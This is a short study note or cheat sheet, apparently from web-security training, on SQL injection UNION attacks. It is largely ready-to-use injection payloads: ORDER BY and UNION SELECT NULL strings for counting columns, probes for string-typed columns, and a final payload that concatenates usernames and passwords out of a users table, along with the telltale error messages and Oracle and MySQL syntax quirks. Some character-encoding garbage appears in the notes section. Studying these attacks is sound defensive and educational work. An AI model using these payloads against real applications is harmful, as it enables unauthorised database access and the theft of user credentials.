# Union Attack Requirements

## `UNION` Query

- The individual queries must return the same number of columns.
- The data types in each column must be compatible between the individual queries.

## Query Attack

- How many columns are being returned from the original query?
- Which columns returned from the original query are of a suitable data type to hold the results from the injected query?

## `ORDER BY` Payload

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
etc.
```

`The ORDER BY position number 3 is out of range of the number of items in the select list.`

## `UNION SELECT` Payload

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.
```

`All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.`

- ðŸ’¡ Note
    - The reason for usingÂ `NULL`Â as the values returned from the injectedÂ `SELECT`Â query is that the data types in each column must be compatible between the original and the injected queries. SinceÂ `NULL`Â is convertible to every commonly used data type, usingÂ `NULL`Â maximizes the chance that the payload will succeed when the column count is correct.
    - On Oracle, everyÂ `SELECT`Â query must use theÂ `FROM`Â keyword and specify a valid table. There is a built-in table on Oracle calledÂ `dual`Â which can be used for this purpose. So the injected queries on Oracle would need to look like:Â `' UNION SELECT NULL FROM DUAL--`.
    - The payloads described use the double-dash comment sequenceÂ `-`Â to comment out the remainder of the original query following the injection point. On MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash characterÂ `#`Â can be used to identify a comment.

## Probing Attack Payloads

```sql
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

`Conversion failed when converting the varchar value 'a' to data type int.`

# **Retrieving multiple values within a single column**

## Concatenating Payload

```sql
' UNION SELECT username || '~' || password FROM users--
```

This uses the double-pipe sequenceÂ `||`Â which is a string concatenation operator on Oracle. The injected query concatenates together the values of theÂ `username`Â andÂ `password`Â fields, separated by theÂ `~`Â character.
